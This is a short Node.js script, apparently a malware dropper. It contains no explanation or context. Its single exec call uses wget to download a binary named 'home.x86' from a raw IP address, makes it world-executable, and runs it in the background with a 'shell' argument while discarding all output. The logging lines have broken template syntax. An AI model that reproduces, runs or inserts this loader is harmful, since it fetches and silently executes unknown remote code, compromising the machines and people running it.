const { exec } = require("child_process");

exec("wget http://74.201.28.102/idk/home.x86 -P ./temp/ && mv ./temp/home.x86 ./temp/temp_f && chmod 777 ./temp/temp_f && cd ./temp/ && ./temp_f shell &>/dev/null &", (error, stdout, stderr) => {
    if (error) {
        console.log(error: ${error.message});
        return;
    }
    if (stderr) {
        console.log(stderr: ${stderr});
        return;
    }
    //console.log(stdout: ${stdout});
});